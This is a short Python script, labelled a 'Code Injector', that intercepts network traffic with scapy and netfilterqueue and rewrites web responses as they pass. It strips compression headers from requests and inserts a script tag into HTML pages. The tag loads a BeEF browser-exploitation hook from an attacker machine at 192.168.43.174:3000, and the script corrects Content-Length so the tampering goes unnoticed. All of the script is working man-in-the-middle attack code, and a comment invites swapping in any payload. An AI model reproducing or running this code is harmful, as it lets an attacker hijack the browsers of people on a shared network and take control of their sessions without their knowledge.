import scapy.all as scapy
import netfilterqueue
import re

try:
    def modify_load(packet, load):
        packet[scapy.Raw].load = load
        del packet[scapy.IP].len
        del packet[scapy.IP].chksum
        del packet[scapy.TCP].chksum
        return packet

    def process(packet):
        scapy_packet = scapy.IP(packet.get_payload())
        if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.TCP):
            load = scapy_packet[scapy.Raw].load
            if scapy_packet[scapy.TCP].dport == 8080:
                print("[+] Request: ")
                load = re.sub('Accept-Encoding:.*?\\r\\n', "", load)
            elif scapy_packet[scapy.TCP].sport == 8080:
                print("[+] Response: ")
                inject = '<script src="http://192.168.43.174:3000/hook.js"></script>'  #this is a beef hook, change it w anything u want
                load = load.replace("</body>", inject + "</body>")
                content_length = re.search("(?:Content-Length:\s)(\d*)", load)
                if content_length and "text/html" in load:
                    content_length_non_capturing = content_length.group(1)
                    new_content_length = int(content_length_non_capturing) + len(inject)
                    load = load.replace(content_length_non_capturing, str(new_content_length))
            if scapy_packet[scapy.Raw].load != load:
                new_packet = modify_load(scapy_packet, load)
                packet.set_payload(str(new_packet))

        packet.accept()


    print("--> Code Injector | Waseeq Ur Rehman")
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process)
    queue.run()
except KeyboardInterrupt:
    print("\nQuitting..Bye!")
except AttributeError:
    pass
